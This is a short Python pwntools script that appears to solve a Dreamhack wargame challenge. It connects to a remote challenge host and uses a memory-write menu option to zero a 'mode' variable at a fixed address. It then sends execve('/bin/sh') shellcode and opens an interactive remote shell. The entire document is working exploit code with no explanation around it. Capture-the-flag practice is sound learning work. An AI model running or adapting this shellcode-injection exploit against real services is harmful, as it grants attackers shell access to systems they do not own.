from pwn import *

port = 10641
rem = remote("host3.dreamhack.games", port)

context.arch = 'amd64'

mode_addr = 0x602090

rem.sendlineafter(b'> ', b'3')
rem.sendlineafter(b'addr: ', str(mode_addr).encode())
rem.sendlineafter(b'value: ', b'0')

shellcode = shellcraft.execve("/bin/sh", 0, 0)
rem.sendlineafter(b'> ', b'1')
rem.sendlineafter(b'shellcode: ', asm(shellcode))

rem.sendlineafter(b'> ', b'2')

rem.interactive()